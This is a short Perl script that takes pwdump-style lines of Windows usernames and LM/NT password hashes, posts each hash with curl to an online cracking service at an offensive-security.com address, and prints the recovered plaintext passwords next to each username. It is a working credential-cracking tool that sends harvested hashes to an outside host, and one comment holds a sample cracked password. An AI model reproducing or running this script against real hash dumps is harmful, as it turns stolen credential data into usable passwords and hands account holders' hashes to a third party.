#!/usr/bin/perl

my $url = "http://cracker.offensive-security.com/insert.php";
my $prio = "xxx";

while(<>) {
  chomp;
  #print ("$_\n");
  if ($_ =~ /^([^:]+):([^:]+):([^:]+):([^:]+)/) {
    my $user = $1;
    my $uid = $2;
    my $h1 = $3;
    my $h2 = $4;
    #print "$user\n";
    my $hash = $h1 . ":" . $h2;
    #print "$hash\n";
    my $results = `curl --data 'hash=$hash\&type=lm\&method=table\&priority=$prio' $url 2>/dev/null`;
    #print "$results\n\n";
    # The plaintext is  - 7A6417Yrjh<META 
    if ($results =~ /plaintext is  - (.+)<META/) {
        my $plaintext = $1;
        print "$user:$plaintext\n";
    }
  }
}
